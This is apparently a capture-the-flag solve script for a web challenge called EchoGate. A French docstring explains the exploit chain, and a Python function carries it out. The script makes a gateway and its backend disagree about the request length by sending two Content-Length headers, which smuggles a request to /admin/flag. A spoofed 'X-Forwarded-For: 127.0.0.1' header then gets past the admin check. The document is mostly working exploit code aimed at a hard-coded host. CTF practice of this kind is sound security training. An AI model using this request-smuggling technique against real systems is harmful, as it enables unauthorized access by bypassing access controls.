#!/usr/bin/env python3
"""
EchoGate (battleCTF, web, 136 pts) — solve

Chaîne :
  1) La gateway (devant le backend) n'autorise QUE les chemins commençant par '/api/'
     (sinon 403 'path not allowed') et relaie le chemin BRUT. Le backend route en
     MATCHING EXACT (404 'not found' custom). Seule route publique : /api/echo (reflète le corps).
  2) La route du flag est /admin/flag, hors '/api/' → bloquée par la gateway.
     Impossible à atteindre par confusion de chemin (pas de normalisation) ni par en-tête
     de réécriture. Le smuggling TE est bloqué ('ambiguous framing' dès qu'un Transfer-Encoding
     est présent). MAIS la gateway accepte un DOUBLE Content-Length (un parseur strict le refuserait).
  3) Desync CL.CL : la gateway lit le body avec le PREMIER Content-Length, le backend avec le
     DERNIER. En mettant un grand CL en premier et un petit (1 octet) en dernier, la gateway lit
     tout le corps et le relaie au backend sur la connexion keep-alive gateway->backend ; le backend
     ne consomme qu'1 octet comme corps de /api/echo, puis parse le RESTE comme une requête pipelinée
     -> on smuggle n'importe quelle requête (hors '/api/') directement au backend, gate contournée.
  4) /admin/flag renvoie 403 'admin access requires internal origin' : le backend accorde l'accès
     admin si l'en-tête 'X-Forwarded-For: 127.0.0.1' est présent (confiance au loopback).
     On l'ajoute à la requête smugglée -> 200 + flag.

Flag : CTF{12de61a5e5def6eb9d565836bd461566}
"""
import socket, time, sys

HOST, PORT = "169.58.126.107", 3005
H = f"Host: {HOST}:{PORT}"


def smuggle(method, path, extra_headers="", sbody=""):
    """Smuggle une requête au backend via desync CL.CL ; renvoie la 2e réponse HTTP (celle du backend)."""
    smug = f"{method} {path} HTTP/1.1\r\n{H}\r\n{extra_headers}"
    smug += (f"Content-Length: {len(sbody)}\r\n\r\n{sbody}" if sbody else "\r\n")
    filler = "X"                       # 1 octet = corps lu par le backend (dernier CL)
    body = filler + smug               # le reste part en requête pipelinée vers le backend
    big, small = len(body), len(filler)
    req = (f"POST /api/echo HTTP/1.1\r\n{H}\r\n"
           f"Content-Type: text/plain\r\n"
           f"Content-Length: {big}\r\n"      # gateway lit CELUI-CI (premier)
           f"Content-Length: {small}\r\n"    # backend lit CELUI-CI (dernier)
           f"Connection: keep-alive\r\n\r\n{body}").encode()
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.sendall(req); time.sleep(0.9); s.settimeout(3); data = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            data += c
    except Exception:
        pass
    s.close()
    parts = [p for p in data.split(b"HTTP/1.1 ") if p]
    resps = ["HTTP/1.1 " + p.decode("latin1") for p in parts]
    return resps[1] if len(resps) > 1 else (resps[0] if resps else "<none>")


if __name__ == "__main__":
    path = sys.argv[1] if len(sys.argv) > 1 else "/admin/flag"
    r = smuggle("GET", path, extra_headers="X-Forwarded-For: 127.0.0.1\r\n")
    print(r.split("\r\n")[0])
    if "\r\n\r\n" in r:
        print(r.split("\r\n\r\n", 1)[1].strip())
